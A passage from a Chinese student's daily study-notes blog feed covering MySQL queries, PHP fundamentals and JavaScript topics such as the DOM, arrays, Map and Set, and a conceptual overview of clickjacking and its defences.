字段名;select * from 表名 limit 开始行数,结束行数;select * from 表名 as 重命名;mysql子查询:类似于嵌套循环，将内层的结果传递到外层进行下一步操作大致有:where,from,exists三个联合查询(两个表的查询):原理——————取得两个结果集的并集union默认选取不同的值。如果允许重复的值，请使用union all(不会去掉结果中的重复行)union all 查询全部而且不会消除重复的行</code></pre><h4 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h4><pre><code>内联查询:select 列名1 from 表名1 inner join 表名2 on 条件;左连接查询(以左边为基准):select 列名1 from 表名1 left join 表名2 on 条件;右链接查询(左边没有的不会显示):select 列名1 from 表名1 right join 表名2 on 条件;嵌套查询:不建议，太慢</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="双十一被学校关在宿舍饲养-不用走到哪都吃狗粮真是太开心了-dog"><a href="#双十一被学校关在宿舍饲养-不用走到哪都吃狗粮真是太开心了-dog" class="headerlink" title="双十一被学校关在宿舍饲养,不用走到哪都吃狗粮真是太开心了(dog)"></a>双十一被学校关在宿舍饲养,不用走到哪都吃狗粮真是太开心了(dog)</h5>]]></content>
      
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础（1）</title>
      <link href="/2022/11/10/20221110/"/>
      <url>/2022/11/10/20221110/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="开始学习PHP"><a href="#开始学习PHP" class="headerlink" title="开始学习PHP"></a>开始学习PHP</h5><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>PHP是超文本预处理器<br>运行在服务器端，内嵌在html脚本语言<br>由wampserver等集成环境，有mysql数据库和apache服务<br>使用localhost或127.0.0.1访问<br>写入的php文件一定要放在www目录下</p><h4 id="php信息"><a href="#php信息" class="headerlink" title="php信息"></a>php信息</h4><p>phpinfo();显示所有php的信息<br>php.ini配置文件</p><h4 id="PHP文件格式"><a href="#PHP文件格式" class="headerlink" title="PHP文件格式"></a>PHP文件格式</h4><pre><code>&lt;?php              //大小写都可以代码部分除最后一行以外每行结尾都要以;结尾?&gt;可以不写php但是要改ini配置文件的short_open_tag=On,要重启</code></pre><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>$变量名(不能是数字或特殊符号开头，可以是中文，建议驼峰命名法)=’value’;<br>echo “$变量名”;        //输出上面传入的值</p><h4 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h4><pre><code>单引号:如果里面有变量都作为一个字符串处理双引号:里面有变量会输出变量的值尽量使用单引号————效率高//单行注释/* */多行注释&quot;\n&quot;换行(双引号解释转义字符，单引号不解释)\r和\t同上&#39;\\&#39;时输出\&#39;\&#39;&#39;时输出&#39;因为\将后面的转义成没意义的字符变量和字符串之间用.连接，而且要&#39;将字符串包起来双引号中插入单引号，单引号再插入变量时，变量会解析成&#39;value&#39;双引号中插入变量时在变量后面加空格或,echo __FILE__;输出文件地址echo __LINE__;输出行号echo __DIR__;输出当前文件的文件夹的路径echo PHP_VERSION;获取php版本号echo __FUNCTION__;输出函数名false的情况:空字符串，0，空数组，null</code></pre><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><pre><code>&lt;分类&gt;标量    浮点类型:float    整数型:int    布尔型:boolean    字符串:string(只要是引号包起来的)混合类型    数组:array    对象:object特殊类型    空:null     资源:resourse    &lt;转换&gt;intval()转整形floatval()转浮点型strval()转字符串boolval()转布尔型&lt;注&gt;空转整形为0空转浮点型变成浮点型的0空转字符串变成空字符串整形后面有字符串会清除字符串保留前面的数字浮点型后面有字符串会清除字符串保留前面的全部数字&lt;判断&gt;is_array();is_string()is_bool();is_float();is_int();is_object();is_numeric();is_resource();is_null();is_scalar();判断标量gettype();只获取类型var_dump();输出值和类型PHP中提供四种整形的定义方式，十进制定义，二进制定义，八进制定义和十六进制定义$a = 120 //十进制$a = 0b110 //二进制$a = 0120     //八进制$a = 0x120    //十六进制// 使用echo输出时。默认输出为十进制decbin() // 十进制转二进制decoct() // 十进制转八进制dechex() // 十进制转十六进制bindec() // 二进制转十进制bin2hex() //二进制转十六进制    字符串：字符串变量用于存储并处理文本。</code></pre><h4 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h4><p>定义:<br>define(‘常量名字’,’常量值————必须是常量’);<br>变量可重新定义，使用的变量必须在上面定义<br>defind(A);判断A是否已经被定义了</p><pre><code>使用 define() 函数设置常量:bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )　　该函数有三个参数:name：必选参数，常量名称，即标志符。value：必选参数，常量的值。case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。&lt;?php // 常量define(&quot;CL&quot;, &quot;这是一个全局常量&quot;, true);echo CL; // 默认false，变量名区分大小写echo cl; // true不区分大小写?&gt;预定义常量PHP预定义了许多常量，这些常量无需使用define()函数定义，可直接在程序中使用。下面列举了一些常用的PHP预定义常量。（1）__FILE__(FILE前后分别是两个下画线)：当前正在处理的脚本文件名，若使用在一个被引用的文件中（include或require），那么　　它的值就是被引用的文件，而不是引用它的那个文件。（2）__LINE__(LINE前后分别是两个下画线)：正在处理的脚本文件的当前行数。（3）PHP_VERSION：当前PHP预处理器的版本，如5.4.16。（4）PHP_OS: PHP所在的操作系统的类型。如Linux。（5）TRUE：表示逻辑真。FALSE：表示逻辑假。NULL：表示没有值或值不确定。（6）DIRECTORY_SEPARATOR: 表示目录分隔符，UNIX或Linux操作系统环境时的值为“ / ”, Window操作系统环境时的值为 “ \ ”。</code></pre><h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><pre><code>算术运算符:+   -   *   /   %赋值运算符:=   +=   -=   /+   %=   .=自增自减运算符:++   --   比较运算符:&lt;   &gt;   &gt;=   &lt;=   ==   ===   !=(仅看值)   !==(看值和数据类型)   &lt;&gt;(相当于!=)逻辑运算符:&amp;&amp;   ||   !(真假反转)静态变量:static 放在函数体内，只会初始化一次变量，以后运行会记录上一次的值预递增++x         //先加再返回预递减--x         //先减再返回后递增x++         //先返回再加后递减x--         //先返回再减非!               //不是true就返回true或or/||           //一个true就true与and/&amp;&amp;          //都true才true异或xor           //有且仅有一个true才是true三元运算符:(expr1) ? (expr2) : (expr3)</code></pre><h4 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h4><pre><code>&lt;单分支&gt;if (条件) &#123;         //真区间;&#125; else &#123;         //假区间;&#125;后续代码;&lt;多分支&gt;switch (条件) &#123;    case 判断条件1 :    case 判断条件2 :    case 判断条件3 :        echo 执行1 ;        break;    case 判断条件4 :        echo 执行2 ;        break;    default:        echo 执行3 ;      //否则        break;&#125;if (条件判断1) &#123;    echo 执行1 ;&#125; else if (条件判断2) &#123;    echo 执行2 ;&#125; else if (条件判断3) &#123;    echo 执行3 ;&#125; else &#123;    echo 执行4 ;&#125;</code></pre><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><pre><code>for (初始条件;条件判断;执行A) &#123;       //程序进行从初始条件开始逆时针    echo 执行B ;&#125;——————————————————————————————————————————————————————————————————————————————while (条件判断) &#123;    echo 执行 ;&#125;——————————————————————————————————————————————————————————————————————————————do &#123;    echo 执行 ;&#125; while (条件判断);     //成立才接着循环——————————————————————————————————————————————————————————————————————————————continue从下一次循环语句开始break终止循环语句</code></pre><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><pre><code>function 函数名 (设置参数$...=...) &#123;    echo 执行;    return 1;       //只返回不输出&#125;函数名 ();上面这样return的1是不会输出的，要输出就要在调用函数前echo函数可以在任何位置调用，但是变量不能在上面调用函数可以调用多次函数体内声明的变量是局部变量，否则是全局变量两者互不污染，同时局部变量与垃圾回收机制有关$_GET $_POST $_COOKIE $_SESSION $GLOBALS  超全局变量(统一内外变量)约束形参:function sum (int $num1 , int $num2)&#123;    return $num1 + $num2;&#125;(sum(&#39;2.3&#39;,3));约束返回值:function sum (int $num1 , int $num2):string&#123;    return $num1 + $num2;&#125;(sum(4,5));php7.0新特性:使用  ...$函数名  来将数组里的值一一给形参赋值匿名函数:将一个没有函数名的函数赋值给一个变量并调用(就是没有名字的函数)static的关键字的使用: * 当一个函数完成时，它的所有变量通常都会被删除。 * 然而，有时候您希望某个局部变量不要被删除。 * 要做到这一点，请在您第一次声明变量时使用 static 关键字：function test()&#123;    static $n=0;    $n++;    echo &quot;调用了一次&quot;.$n.&quot;\n&quot;;&#125;test();test();test();?&gt;</code></pre><h4 id="PHP变量作用域"><a href="#PHP变量作用域" class="headerlink" title="PHP变量作用域"></a>PHP变量作用域</h4><p>PHP 有三种不同的变量作用域：<br>local（局部）:函数内部声明的变量只能在函数内部进行访问<br>global（全局）:函数之外声明的变量只能在函数以外进行访问<br>static（静态）:静态变量仅在局部函数域中存在，当函数执行离开此作用域时，其值不会消失(例如拿来判断循环退出的变量)<br>内部函数想要引用外部变量可以引入global关键字global $outer;<br>注释：static变量仍然是函数的局部变量</p><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><p>查手册</p><h4 id="书写建议"><a href="#书写建议" class="headerlink" title="书写建议"></a>书写建议</h4><p>能加空格就加</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="幸运的人一生被童年治愈，不幸的人用一生治愈童年。"><a href="#幸运的人一生被童年治愈，不幸的人用一生治愈童年。" class="headerlink" title="幸运的人一生被童年治愈，不幸的人用一生治愈童年。"></a>幸运的人一生被童年治愈，不幸的人用一生治愈童年。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript深入了解</title>
      <link href="/2022/11/09/20221109/"/>
      <url>/2022/11/09/20221109/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h4><p>递归:调用函数时调用自身<br>最大的嵌套调用次数（包括首次）被称为 递归深度。</p><p>两种思考方式:<br>1.迭代思路：使用 for 循环<br>2.递归思路：简化任务，调用自身</p><h4 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h4><p>堆和栈是cpu的两个部分，栈用于存储数据，堆<br>遵守先入后出原则，存入数据是压栈，放出数据叫弹栈POP(内存的数据不删除，但是放入回收站)<br>如果只入不出(没有return)就会栈溢出，导致程序错误<br>执行上下文和堆栈:<br>执行上下文是一个内部数据结构，它包含有关函数执行时的详细细节：当前控制流所在的位置，当前的变量，this 的值（此处我们不使用它），以及其它的一些内部细节。<br>一个函数调用仅具有一个与其相关联的执行上下文。</p><p>函数进行嵌套调用时:</p><pre><code>当前函数被暂停；1.与它关联的执行上下文被一个叫做 执行上下文堆栈 的特殊数据结构保存；2.执行嵌套调用；3.嵌套调用结束后，从堆栈中恢复之前的执行上下文，并从停止的位置恢复外部函数。</code></pre><h4 id="Rest-参数与-Spread-语法"><a href="#Rest-参数与-Spread-语法" class="headerlink" title="Rest 参数与 Spread 语法"></a>Rest 参数与 Spread 语法</h4><p>当我们在代码中看到 “…” 时，它要么是 rest 参数，要么是 spread 语法。<br>有一个简单的方法可以区分它们：<br>若 … 出现在函数参数列表的最后，那么它就是 rest 参数，它会把参数列表中剩余的参数收集到一个数组中。<br>若 … 出现在函数调用或类似的表达式中，那它就是 spread 语法，它会把一个数组展开为列表。<br>使用场景：<br>Rest 参数用于创建可接受任意数量参数的函数。<br>Spread 语法用于将数组传递给通常需要含有许多参数的函数。<br>我们可以使用这两种语法轻松地互相转换列表与参数数组。<br>旧式的 arguments（类数组且可迭代的对象）也依然能够帮助我们获取函数调用中的所有参数。</p><h4 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h4><p>通常，函数调用完成后，会将词法环境和其中的所有变量从内存中删除。因为现在没有任何对它们的引用了。与 JavaScript 中的任何其他对象一样，词法环境仅在可达时才会被保留在内存中。<br>但是，如果有一个嵌套的函数在函数结束后仍可达，则它将具有引用词法环境的[[Environment]] 属性。<br>如果在（外部）函数执行完成后，它的词法环境仍然可达。因此，此词法环境仍然有效。<br>若要删除则需要令词法环境对象变得不可达</p><h4 id="属性标志"><a href="#属性标志" class="headerlink" title="属性标志"></a>属性标志</h4><p>value<br>writable — 如果为 true，则值可以被修改，否则它是只可读的。<br>enumerable — 如果为 true，则会被在循环中列出，否则不会被列出。<br>configurable — 如果为 true，则此属性可以被删除，这些特性也可以被修改，否则不可以。</p><h4 id="浏览器环境，规格"><a href="#浏览器环境，规格" class="headerlink" title="浏览器环境，规格"></a>浏览器环境，规格</h4><p>能运行 JavaScript 的平台称为主机环境<br>包含DOM，BOM，JavaScript</p><pre><code>文档对象模型（DOM）将所有页面内容表示为可以修改的对象浏览器对象模型（BOM）表示由浏览器（主机环境）提供的用于处理文档（document）之外的所有内容的其他对象  例如:      navigator 对象提供了有关浏览器和操作系统的背景信息          navigator.userAgent —— 关于当前浏览器          navigator.platform —— 关于平台（有助于区分 Windows/Linux/Mac 等）      location 对象允许我们读取当前 URL，并且可以将浏览器重定向到新的 URL</code></pre><h4 id="DOM-树"><a href="#DOM-树" class="headerlink" title="DOM 树"></a>DOM 树</h4><p>概念:<br>DOM 将 HTML 表示为标签的树形结构。<br>每个树的节点都是一个对象。<br>标签被称为 元素节点（或者仅仅是元素），元素内的文本形成 文本节点，被标记为 ＃text。一个文本节点只包含一个字符串。它没有子项，并且总是树的叶子。</p><p>自动修正:<br>浏览器遇到格式不正确的 HTML，它会在形成 DOM 时自动更正它。</p><p>浏览器开发工具元素（Elements）选项卡:<br>Styles —— 我们可以看到按规则应用于当前元素的 CSS 规则，包括内建规则（灰色）。几乎所有内容都可以就地编辑，包括下面的方框的 dimension/margin/padding。<br>Computed —— 按属性查看应用于元素的 CSS：对于每个属性，我们可以都可以看到赋予它的规则（包括 CSS 继承等）。<br>Event Listeners —— 查看附加到 DOM 元素的事件侦听器（我们将在本教程的下一部分介绍它们）。</p><p>节点属性:</p><pre><code>每个 DOM 节点都属于一个特定的类。这些类形成层次结构（hierarchy）。完整的属性和方法集是继承的结果。主要的 DOM 节点属性有：nodeType    我们可以使用它来查看节点是文本节点还是元素节点。它具有一个数值型值（numeric value）：1 表示元素，3 表示文本节点，其他一些则代表其他节点类型。只读。nodeName/tagName    用于元素名，标签名（除了 XML 模式，都要大写）。对于非元素节点，nodeName 描述了它是什么。只读。innerHTML    元素的 HTML 内容。可以被修改。outerHTML    元素的完整 HTML。对 elem.outerHTML 的写入操作不会触及 elem 本身。而是在外部上下文中将其替换为新的 HTML。nodeValue/data    非元素节点（文本、注释）的内容。两者几乎一样，我们通常使用 data。可以被修改。textContent    元素内的文本：HTML 减去所有 &lt;tags&gt;。写入文本会将文本放入元素内，所有特殊字符和标签均被视为文本。可以安全地插入用户生成的文本，并防止不必要的 HTML 插入。hidden    当被设置为 true 时，执行与 CSS display:none 相同的事。DOM 节点还具有其他属性，具体有哪些属性则取决于它们的类。例如，&lt;input&gt; 元素（HTMLInputElement）支持 value，type，而 &lt;a&gt; 元素（HTMLAnchorElement）则支持 href 等。大多数标准 HTML 特性（attribute）都具有相应的 DOM 属性。</code></pre><h4 id="弹窗和-window-的方法"><a href="#弹窗和-window-的方法" class="headerlink" title="弹窗和 window 的方法"></a>弹窗和 window 的方法</h4><p>window.open(‘<a href="https://javascript.info/&#39;)%E6%89%93%E5%BC%80%E4%B8%80%E4%B8%AA%E5%85%B7%E6%9C%89%E7%BB%99%E5%AE%9A">https://javascript.info/&#39;)打开一个具有给定</a> URL 的新窗口</p><pre><code>阻止弹窗:1.阻止除了用户触发的事件之外的弹窗// 弹窗被阻止window.open(&#39;https://javascript.info&#39;);// 弹窗被允许button.onclick = () =&gt; &#123;  window.open(&#39;https://javascript.info&#39;);&#125;;2.浏览器可以接受不同时间的延迟，超过这个时间则移除“信任”// 1 秒后打开弹窗setTimeout(() =&gt; window.open(&#39;http://google.com&#39;), 1000);</code></pre><h4 id="window-open"><a href="#window-open" class="headerlink" title="window.open"></a>window.open</h4><p>打开一个弹窗的语法是 window.open(url, name, params)<br>其中params是width=200,height=100<br>窗口功能<br>menubar（yes/no）—— 显示或隐藏新窗口的浏览器菜单。<br>toolbar（yes/no）—— 显示或隐藏新窗口的浏览器导航栏（后退，前进，重新加载等）。<br>location（yes/no）—— 显示或隐藏新窗口的 URL 字段。Firefox 和 IE 浏览器不允许默认隐藏它。<br>status（yes/no）—— 显示或隐藏状态栏。同样，大多数浏览器都强制显示它。<br>resizable（yes/no）—— 允许禁用新窗口大小调整。不建议使用。<br>scrollbars（yes/no）—— 允许禁用新窗口的滚动条。不建议使用。</p><h4 id="跨窗口通信"><a href="#跨窗口通信" class="headerlink" title="跨窗口通信"></a>跨窗口通信</h4><p>“同源（Same Origin）”策略(保护用户免遭信息盗窃)限制了窗口（window）和 frame 之间的相互访问。<br>如果两个 URL 具有相同的协议，域和端口，则称它们是“同源”的。<br>“同源”策略规定：<br>1.如果我们有对另外一个窗口的引用，并且该窗口是同源的，那么我们就具有对该窗口的全部访问权限。<br>2.否则，就无法访问该窗口中的任何东西。唯一的例外是 location：我们可以修改它（进而重定向用户）。但是我们无法读取 location（因此，我们无法看到用户当前所处的位置，也就不会泄漏任何信息）。</p><h4 id="点击劫持攻击"><a href="#点击劫持攻击" class="headerlink" title="点击劫持攻击"></a>点击劫持攻击</h4><p>原理:<br>1.访问者被恶意页面吸引<br>2.页面上有一个看起来无害的链接<br>3.放置了一个透明的iframe标签，通常通过 z-index 实现的<br>点击劫持是对点击事件，而非键盘事件<br>防御:<br>1.阻止因更改 beforeunload 事件处理程序中的 top.location 而引起的过渡————当 iframe 试图更改 top.location 时，访问者会收到一条消息，询问他们是否要离开页面<br>2.利用Sandbox 特性，添加sandbox=”allow-scripts allow-forms” 的 iframe。允许脚本和表单。但没有 allow-top-navigation，因此禁止更改 top.location 。<br>3.服务器端 header X-Frame-Options 可以允许或禁止在 frame 中显示页面。(副作用大)<br>4.具有 samesite 特性的 cookie 仅在网站是通过直接方式打开（而不是通过 frame 或其他方式）的情况下才发送到网站。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="落月随山隐，"><a href="#落月随山隐，" class="headerlink" title="落月随山隐，"></a>落月随山隐，</h5><h5 id="山随月落隐。"><a href="#山随月落隐。" class="headerlink" title="山随月落隐。"></a>山随月落隐。</h5><h5 id="月落山随隐，"><a href="#月落山随隐，" class="headerlink" title="月落山随隐，"></a>月落山随隐，</h5><h5 id="随月落山隐。"><a href="#随月落山隐。" class="headerlink" title="随月落山隐。"></a>随月落山隐。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript拓展（3）</title>
      <link href="/2022/11/08/20221108/"/>
      <url>/2022/11/08/20221108/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>数组（Array）能存储有序的集合</p><p>声明:</p><pre><code>let arr = new Array();let fruits = [&quot;Apple&quot;, &quot;Orange&quot;, &quot;Plum&quot;];重新定义就能更改value增加array只需要定义新位置fruits.length是元素的个数以逗号结尾</code></pre><p>查找:<br>fruits[fruits.length - 1]&lt;因为方括号中的索引是被按照其字面意思处理的&gt;<br>fruits.at(-1)<br>不能用fruits[-1]查找元素,结果是 undefined</p><p>更改:<br>push 在末端添加一个元素<br>pop 从末端取出并删除一个元素<br>unshift 在数组的首端添加元素<br>shift 取出队列首端的一个元素，整个队列往前移，这样原先排第二的元素现在排在了第一个<br>(push 和 unshift 方法都可以一次添加多个元素)<br>push/pop 方法运行的比较快，而 shift/unshift 比较慢</p><p>slice:<br>arr.slice([start], [end])<br>返回一个新数组，将所有从索引 start 到 end（不包括 end）的数组项复制到一个新的数组。start 和 end 都可以是负数，在这种情况下，从末尾计算索引</p><p>splice:<br>arr.splice(start[, deleteCount, elem1, …, elemN])<br>从索引 start 开始修改 arr：删除 deleteCount 个元素并在当前位置插入 elem1, …, elemN。最后返回被删除的元素所组成的数组</p><p>concat:<br>arr.concat(arg1, arg2…)<br>创建一个包含来自于 arr，然后是 arg1，arg2 的元素的新数组。<br>如果参数 argN 是一个数组，那么其中的所有元素都会被复制。否则，将复制参数本身。<br>如果类数组对象具有 Symbol.isConcatSpreadable 属性，那么它的元素就会被添加</p><p>遍历:<br>for..of 不能获取当前元素的索引，只是获取元素值<br>for..in 会遍历所有属性，不仅仅是数字属性，而且不适用于数组，因此速度要慢<br>forEach 允许为数组的每个元素都运行一个函数</p><p>关于 “length”:<br>不是数组里元素的个数，而是最大的数字索引值加一<br>通过减少length来截断数组，但length恢复后数组不会恢复<br>清空数组最简单的方法就是：arr.length = 0;</p><p>new Array():<br>创建一个指定了长度，却没有任何项的数组</p><p>多维数组:<br>matrix[1][1]最中间的那个数</p><p>toString:<br>返回以逗号隔开的元素列表</p><p>使用 == 比较数组:<br>1.仅当两个对象引用的是同一个对象时，它们才相等 ==<br>2.如果 == 左右两个参数之中有一个参数是对象，另一个参数是原始类型，那么该对象将会被转换为原始类型<br>3.……null 和 undefined 相等 ==，且各自不等于任何其他的值</p><p>在数组中搜索:<br>arr.indexOf(item, from);<br>从索引 from 开始搜索 item，如果找到则返回索引，否则返回 -1。<br>arr.includes(item, from);<br>从索引 from 开始搜索 item，如果找到则返回 true（没找到则返回 false）。<br>alert( fruits.lastIndexOf(‘Apple’) );<br>与 indexOf 相同，但从右向左查找<br>arr.find(function(item, index, array);<br>item 是元素。index 是它的索引。array 是数组本身。<br>如果返回 true，则返回 item 并停止迭代;对于假值，则返回 undefined<br>arr.filter(function(item, index, array);<br>如果 true item 被 push 到 results，迭代继续;如果什么都没找到，则返回空数组<br>indexOf 和 includes 使用严格相等 === 进行比较。所以，搜索 false时会准确找到 false 而不是数字 0<br>includes可以正确处理 NaN</p><p>转换数组:<br>arr.map(function(item, index, array)<br>对数组的每个元素都调用函数，并返回结果数组<br>arr.sort();<br>默认情况下被按字符串进行排序<br>arr.sort(compareNumeric);<br>按数字进行排序<br>arr.reverse();<br>倒序</p><p>分割粘合数组:<br>let arr = names.split(‘, ‘,2);<br>将字符串分割成一个个数组,限制数组长度为2,额外的元素会被忽略<br>str.split(‘’);<br>将字符串拆分为字母数组<br>arr.join(‘;’);<br>根据;粘合数组</p><p>从数组中区分出普通对象:<br>Array.isArray({})<br>如果 value 是一个数组，则返回 true；否则返回 false。</p><h4 id="Iterable-object（可迭代对象）"><a href="#Iterable-object（可迭代对象）" class="headerlink" title="Iterable object（可迭代对象）"></a>Iterable object（可迭代对象）</h4><p>可以应用 for..of 的对象被称为 可迭代的。<br>技术上来说，可迭代对象必须实现 Symbol.iterator 方法。<br>obj[Symbol.iterator].() 的结果被称为迭代器（iterator）。由它处理进一步的迭代过程。<br>一个迭代器必须有 next() 方法，它返回一个 {done: Boolean, value: any} 对象，这里 done:true 表明迭代结束，否则 value 就是下一个值。<br>Symbol.iterator 方法会被 for..of 自动调用，但我们也可以直接调用它。<br>内建的可迭代对象例如字符串和数组，都实现了 Symbol.iterator。<br>字符串迭代器能够识别代理对。<br>有索引属性和 length 属性的对象被称为 类数组对象。这种对象可能还具有其他属性和方法，但是没有数组的内建方法。<br>如果我们仔细研究一下规范 —— 就会发现大多数内建方法都假设它们需要处理的是可迭代对象或者类数组对象，而不是“真正的”数组，因为这样抽象度更高。<br>Array.from(obj[, mapFn, thisArg]) 将可迭代对象或类数组对象 obj 转化为真正的数组 Array，然后我们就可以对它应用数组的方法。可选参数 mapFn 和 thisArg 允许我们将函数应用到每个元素。</p><h4 id="Map-and-Set（映射和集合）"><a href="#Map-and-Set（映射和集合）" class="headerlink" title="Map and Set（映射和集合）"></a>Map and Set（映射和集合）</h4><p>Map 是一个带键的数据项的集合，就像一个 Object 一样。 但是它们最大的差别是 Map 允许任何类型的键（key）。</p><pre><code>Mapnew Map() —— 创建 map。map.set(key, value) —— 根据键存储值。map.get(key) —— 根据键来返回值，如果 map 中不存在对应的 key，则返回 undefined。map.has(key) —— 如果 key 存在则返回 true，否则返回 false。map.delete(key) —— 删除指定键的值。map.clear() —— 清空 map。map.size —— 返回当前元素个数。Map 迭代map.keys() —— 遍历并返回一个包含所有键的可迭代对象，map.values() —— 遍历并返回一个包含所有值的可迭代对象，map.entries() —— 遍历并返回一个包含所有实体 [key, value] 的可迭代对象，for..of 在默认情况下使用的就是这个。</code></pre><p>Object.entries：从对象创建 Map<br>let map = new Map(Object.entries(obj));<br>Object.fromEntries：从 Map 创建对象<br>let obj = Object.fromEntries(map.entries()); // 创建一个普通对象（plain object）(*)</p><pre><code>Setnew Set(iterable) —— 创建一个 set，如果提供了一个 iterable 对象（通常是数组），将会从数组里面复制值到 set 中。set.add(value) —— 添加一个值，返回 set 本身set.delete(value) —— 删除值，如果 value 在这个方法调用的时候存在则返回 true ，否则返回 false。set.has(value) —— 如果 value 在 set 中，返回 true，否则返回 false。set.clear() —— 清空 set。set.size —— 返回元素个数。Set 迭代（iteration）set.keys() —— 遍历并返回一个包含所有值的可迭代对象，set.values() —— 与 set.keys() 作用相同，这是为了兼容 Map，set.entries() —— 遍历并返回一个包含所有的实体 [value, value] 的可迭代对象，它的存在也是为了兼容 Map。</code></pre><h4 id="WeakMap"><a href="#WeakMap" class="headerlink" title="WeakMap"></a>WeakMap</h4><p>WeakMap 是类似于 Map 的集合，它仅允许对象作为键，并且一旦通过其他方式无法访问这些对象，垃圾回收便会将这些对象与其关联值一同删除。</p><p>WeakSet 是类似于 Set 的集合，它仅存储对象，并且一旦通过其他方式无法访问这些对象，垃圾回收便会将这些对象删除。</p><p>它们的主要优点是它们对对象是弱引用，所以被它们引用的对象很容易地被垃圾收集器移除。</p><p>这是以不支持 clear、size、keys、values 等作为代价换来的……</p><p>WeakMap 和 WeakSet 被用作“主要”对象存储之外的“辅助”数据结构。一旦将对象从主存储器中删除，如果该对象仅被用作 WeakMap 或 WeakSet 的键，那么该对象将被自动清除。</p><h4 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h4><p>JSON 是一种数据格式，具有自己的独立标准和大多数编程语言的库。<br>JSON 支持 object，array，string，number，boolean 和 null。<br>JavaScript 提供序列化（serialize）成 JSON 的方法 JSON.stringify 和解析 JSON 的方法 JSON.parse。<br>这两种方法都支持用于智能读/写的转换函数。<br>如果一个对象具有 toJSON，那么它会被 JSON.stringify 调用。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="今天就想说一句-我这是学js上头了嘛，为啥学这么细……"><a href="#今天就想说一句-我这是学js上头了嘛，为啥学这么细……" class="headerlink" title="今天就想说一句:我这是学js上头了嘛，为啥学这么细……"></a>今天就想说一句:我这是学js上头了嘛，为啥学这么细……</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript拓展（2）</title>
      <link href="/2022/11/07/20221107/"/>
      <url>/2022/11/07/20221107/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="原始类型的方法"><a href="#原始类型的方法" class="headerlink" title="原始类型的方法"></a>原始类型的方法</h4><h5 id="原始类型和对象之间的关键区别。"><a href="#原始类型和对象之间的关键区别。" class="headerlink" title="原始类型和对象之间的关键区别。"></a>原始类型和对象之间的关键区别。</h5><p>一个原始值：<br>是原始类型中的一种值。<br>在 JavaScript 中有 7 种原始类型：string，number，bigint，boolean，symbol，null 和 undefined。<br>一个对象：<br>能够存储多个值作为属性。<br>可以使用大括号 {} 创建对象，例如：{name: “John”, age: 30}。JavaScript 中还有其他种类的对象，例如函数就是对象。<br>原始类型不是对象，它们不能存储额外的数据。</p><h4 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h4><p>两种类型:<br>常规数字以 64 位的格式 IEEE-754 存储，也被称为“双精度浮点数”<br>BigInt 用于表示任意长度的整数</p><p>编写数字的方法:<br>let billion = 1e9;           // 10 亿，字面意思：数字 1 后面跟 9 个 0<br>alert( 7.3e9 );              // 73 亿（与 7300000000 和 7_300_000_000 相同）<br>let mcs = 0.000001 = 1e-6;   // 1 的左边有 6 个 0;</p><p>二进制0b  八进制0o  十六进制0x</p><p>toString(base):<br>返回在给定 base 进制数字系统中 num 的字符串表示形式<br>alert( 123456..toString(36) );     // 三十六进制，2n9c</p><p>使用两个点来调用一个方法:<br>123456.toString(36)相当于(123456).toString(36)<br>语法隐含了第一个点之后的部分为小数部分。再放一个点，JS就知道小数部分为空。</p><p>舍入:</p><pre><code>        Math.floor     Math.ceil     Math.round     Math.trunc3.1        3              4             3             33.6        3              4           4           3-1.1       -2             -1            -1            -1-1.6       -2             -1            -2            -1</code></pre><p>Math.floor向下舍入<br>Math.ceil向上舍入<br>Math.round向最近的整数舍入<br>Math.trunc（IE 浏览器不支持这个方法）移除小数点后的所有内容而没有舍入</p><p>舍入到小数点后 n 位:<br>1.将数字乘以 